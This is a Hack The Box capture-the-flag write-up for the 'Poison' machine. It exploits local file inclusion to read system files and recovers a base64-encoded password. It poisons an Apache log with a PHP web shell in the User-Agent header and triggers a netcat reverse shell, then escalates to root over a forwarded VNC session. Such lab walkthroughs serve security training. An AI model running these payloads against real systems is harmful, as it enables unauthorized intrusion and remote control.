## Poison

Difficulty: Medium

### User Flag

```
rustscan -a 10.10.10.84 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/bc68034a-3fc7-42a6-8b81-d912d1cb0c12)

<br>

The website has a function to test scripts that executes php.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/7dce5b7a-4c54-4519-91a7-f90a70a30dc2)

<br>

The file parameter is vulnerable to LFI. Accessing /etc/passwd we enumerate "charix" user.

![lfiPasswd](https://github.com/b1d0ws/OSCP/assets/58514930/8478f827-d8ac-417b-b8d6-8a126c25072f)

<br>

Reading listfiles.php, we find a pwdbackup.txt.  

This is the easiest way to get user shell. Read this file, decrypt it 13 times in base64 and access user charix.  

This script speed this process.

```bash
#!/bin/bash
message="PASSWORD"
for (( i=1; i<=13; i++ )); do
    message=$(echo "$message" | base64 -d)
done
echo "Decoded message: $message
```

![listfilesPHP](https://github.com/b1d0ws/OSCP/assets/58514930/1fdc2aad-0101-43dd-872a-db3a54dfa87c)

![pwdBackupTxt](https://github.com/b1d0ws/OSCP/assets/58514930/f171b3c2-b212-4d35-b41e-e1583e6096e1)

![decryptPass](https://github.com/b1d0ws/OSCP/assets/58514930/3cb7ebe0-3fde-4427-9300-da3fc214d1c1)

<br>

The other way to get the user shell is via LFI Log Poisoning.  

You can access the log files in /var/log/httpd-access.log  

![accessLog](https://github.com/b1d0ws/OSCP/assets/58514930/d2ebce12-d4ab-4dae-b508-dd064109d36f)

<br>

Put a web shell with user-agent header and access the log file to get the reverse shell.

```
User-Agent: <php system($_GET['cmd']); ?>
curl "http://poison.htb/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 1234 >/tmp/f"
```

![requestUserAgent](https://github.com/b1d0ws/OSCP/assets/58514930/424f69ed-ab78-43de-a7d9-3d4d1feeb4d1)

![gettingReverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/23e0fa25-3744-4d20-9102-5d212131d485)

<br>

### Root Flag

Inside user home, there is a secret file. Copy to our machine wich scp and read it. It seems that it is ofuscated.

```
scp charix@poison.htb:/home/charix/secret.zip .
```

![secretFile](https://github.com/b1d0ws/OSCP/assets/58514930/a8b09257-5724-4c93-bbac-9a748d85aa0b)

<br>

Enumerating the machine, we discover a root process running VNC.

```
ps -aux
```

![xvncProcess](https://github.com/b1d0ws/OSCP/assets/58514930/9e0e1c27-a649-4127-b2cf-f0b3028a6796)

<br>

Checking for open ports, we see VNC ports running: 5801 and 5901.

```
netstat -na -f inet
```

![runningPorts](https://github.com/b1d0ws/OSCP/assets/58514930/d4246cca-5579-4965-982c-720055f712bf)

<br>

We can port forward this and connect to VNC with the secret file as password.

```
ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84
vncviewer -passwd secret 127.0.0.1::5901
```

![rootVNC](https://github.com/b1d0ws/OSCP/assets/58514930/5f353518-82bb-48ee-ad02-1f7d0f07d728)

<br>

Bonus: we can also discover the password with vncpwd.

```
./vncpwd ../secret
```

![vncPassword](https://github.com/b1d0ws/OSCP/assets/58514930/2fa04f63-bd12-46a7-8173-feab8ca11e22)
